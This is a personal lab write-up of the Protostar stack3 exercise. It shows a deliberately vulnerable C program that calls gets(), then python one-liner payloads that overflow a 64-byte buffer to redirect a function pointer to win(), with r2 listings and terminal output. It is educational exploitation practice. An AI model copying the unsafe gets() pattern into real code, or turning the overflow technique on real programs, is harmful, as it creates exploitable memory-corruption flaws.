
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Let's do a test run:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack3
hello
```

We have a 64 char buffer once again, but this time we have a function pointer to overwrite :)
Since we have another gets() and we will want to try different output we'll pipe the input to the program like:
`python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>`

```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./stack3           
calling function pointer, jumping to 0x61626364
zsh: done                python -c "print('A' * 64 + '\x64\x63\x62\x61')" | 
zsh: segmentation fault  ./stack3
```

There, we set the right location in memory, but what is the address on the function. Let's find out:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ r2 -d -A stack3                                                                          
...
[0xf7f825b0]> afl
0x08048330    1      6 sym.imp.gets
0x08048340    1      6 sym.imp.__libc_start_main
0x08048350    1      6 sym.imp.printf
0x08048360    1      6 sym.imp.puts
0x08048370    1     33 entry0
0x080483a0    6     85 sym.__do_global_dtors_aux
0x08048400    4     35 sym.frame_dummy
0x080484f0    4     42 sym.__do_global_ctors_aux
0x08048480    1      5 sym.__libc_csu_fini
0x0804851c    1     28 sym._fini
0x08048424    1     20 sym.win
0x08048490    4     90 sym.__libc_csu_init
0x080484ea    1      4 sym.__i686.get_pc_thunk.bx
0x08048438    3     65 main
0x080482e0    3     48 sym._init
0x08048320    1      6 loc.imp.__gmon_start__
```

The win() function is at memory address 0x08048424
```
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ python -c "print('A' * 64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x0484c224
zsh: done                python -c "print('A' * 64 + '\x24\x84\x04\x08')" | 
zsh: segmentation fault  ./stack3
```

Checked that this works for other people. We're on my kali vm, not on the original ISO vm since it has us keyb.

We used the THM bof1 rooms vm to compile and run the code (the elf couldn't start)
```sh
[user1@ip-10-10-48-4 ~]$ nano stack3.c
[user1@ip-10-10-48-4 ~]$ gcc stack3.c -o stack3 -fno-stack-protector -no-pie
stack3.c: In function ‘main’:
stack3.c:18:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buffer);
   ^~~~
   fgets
/tmp/cce1W5Mq.o: In function `main':
stack3.c:(.text+0x35): warning: the `gets' function is dangerous and should not be used.
[user1@ip-10-10-48-4 ~]$ ls -la st*
```

```sh
[user1@ip-10-10-48-4 ~]$ r2 -d -A stack3
...
[0x7ffff7dd9ef0]> afl
0x00400490    1 42           entry0
0x004004c0    4 37           sym.deregister_tm_clones
0x004004f0    4 55           sym.register_tm_clones
0x00400530    3 29           entry.fini0
0x00400550    1 7            entry.init0
0x00400620    1 2            sym.__libc_csu_fini
0x00400624    1 9            sym._fini
0x004005c0    3 93   -> 84   sym.__libc_csu_init
0x00400438    3 23           sym._init
0x00400557    1 17           sym.win
0x00400460    1 6            sym.imp.puts
0x00400568    3 87           main
0x00400480    1 6            sym.imp.gets
0x00400470    1 6            sym.imp.printf
```
The win() function is at 0x00400557.

```sh
[user1@ip-10-10-48-4 ~]$ python -c "print('A'*64+'\x57\x05\x40\x00')" | ./stack3
[user1@ip-10-10-48-4 ~]$ python -c "print('A'*640+'\x57\x05\x40\x00')" | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault
[user1@ip-10-10-48-4 ~]$ python -c "print('A'*70+'\x57\x05\x40\x00')" | ./stack3
calling function pointer, jumping to 0x00000040
Segmentation fault
[user1@ip-10-10-48-4 ~]$ python -c "print('A'*72+'\x57\x05\x40\x00')" | ./stack3
calling function pointer, jumping to 0x00400557
code flow successfully changed
```
There are a few extra bytes on this machine compared to the original image but we can run it.

---

Looking at the program in edb (gui app)

Graph of main()
![[Images/Pasted image 20240823160707.png]]

Here we can clearly see the if:
- the red arrow if it's true, going to call printf() and then the function pointers function
- the green arrow skips the contents of the if and hops straight to 0x08048477 where we have the leave and ret

![[Images/Pasted image 20240823161658.png|600]]


new compiled version - functions
![[Images/Pasted image 20240823170958.png]]

0x08049186


recompiled in the kali vm:

```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ gcc stack3.c -o stack3-compiled -fno-stack-protector -no-pie -m32
stack3.c: In function ‘main’:
stack3.c:18:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   18 |   gets(buffer);
      |   ^~~~
      |   fgets
/usr/bin/ld: /tmp/ccp2vO6Q.o: in function `main':
stack3.c:(.text+0x57): warning: the `gets' function is dangerous and should not be used.
```

```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ python -c "print('A' * 64 + '\x86\x91\x04\x08')" | edb --run ./stack3-compiled
```

![[Images/Pasted image 20240823175028.png]]

0xc2 is inserted twice:
![[Images/Pasted image 20240823174605.png]]

